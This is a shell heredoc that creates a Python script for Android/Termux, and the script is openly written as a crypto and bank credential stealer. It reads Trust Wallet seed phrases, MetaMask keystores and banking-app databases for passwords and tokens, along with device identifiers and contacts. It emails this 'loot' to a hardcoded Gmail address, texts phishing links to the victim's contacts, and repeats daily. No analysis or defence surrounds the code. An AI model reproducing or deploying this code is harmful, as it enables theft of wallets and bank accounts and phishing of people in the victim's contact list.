cat > crypto.py << 'EOF'
#!/usr/bin/env python3
import smtplib, ssl, time, random, json, subprocess, re, os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

GMAIL_USER = "balls14666@gmail.com"
GMAIL_PASS = "googlepass"  # ← CHANGE THIS!

def send_loot(to_email, subject, body):
    msg = MIMEMultipart()
    msg['From'] = GMAIL_USER
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    
    context = ssl.create_default_context()
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as server:
            server.login(GMAIL_USER, GMAIL_PASS)
            server.sendmail(GMAIL_USER, to_email, msg.as_string())
        return True
    except Exception as e:
        print(f"Send failed: {e}")
        return False

# STEAL CRYPTO (Trust/MetaMask/Exodus)
def steal_crypto():
    data = {}
    try:
        # Trust Wallet seed
        seed = subprocess.check_output("find /data/data -name '*trust*' -path '*/shared_prefs/*' 2>/dev/null | xargs grep -l 'mnemonic' | xargs cat 2>/dev/null", shell=True, timeout=10).decode()
        data['trust_seed'] = re.findall(r'"([^"]+)"', seed)
    except: pass
    
    try:
        # MetaMask keys
        keys = subprocess.check_output("find /data/data -name '*metamask*' -path '*/keystore/*' 2>/dev/null | head -5 | xargs cat 2>/dev/null", shell=True, timeout=10).decode()
        data['metamask'] = keys
    except: pass
    
    return data

# STEAL BANKS
def steal_banks():
    data = {}
    banks = ['chase', 'wellsfargo', 'bankofamerica', 'paypal', 'coinbase']
    for bank in banks:
        try:
            dump = subprocess.check_output(f"find /data/data/*{bank}* -name '*.db' -o -name '*pref*' 2>/dev/null | head -3 | xargs strings 2>/dev/null | grep -i 'pass\\|token\\|user'", shell=True, timeout=5).decode()
            if dump: data[bank] = dump
        except: pass
    return data

# Get contacts for spreading
def get_contacts():
    try:
        contacts = subprocess.check_output("termux-contact-list", shell=True).decode()
        numbers = re.findall(r'"number":"(\+\d+)"', contacts)
        return numbers[:10]
    except:
        return []

# MAIN EXFIL
def exfiltrate():
    loot = {
        'device': subprocess.check_output('getprop ro.product.model; getprop ro.serialno', shell=True).decode(),
        'crypto': steal_crypto(),
        'banks': steal_banks(),
        'contacts': get_contacts()
    }
    
    # Send to YOUR Gmail
    loot_json = json.dumps(loot, indent=2)
    send_loot("balls14666@gmail.com", "💰 CRYPTO LOOT DROPPED", loot_json)
    
    # Spread to random contacts (phish link)
    contacts = get_contacts()
    for num in contacts[:3]:
        send_loot(f"{num[1:]}@vtext.com", "Wallet Hacked! FIX NOW", "Your wallet drained! Recovery: bit.ly/freebtc-fix")

# BACKGROUND LOOP (Daily + triggers)
while True:
    try:
        exfiltrate()
        time.sleep(86400)  # 24h
    except KeyboardInterrupt:
        break
    except:
        time.sleep(3600)  # Retry hourly if crash
EOF

chmod +x crypto.py



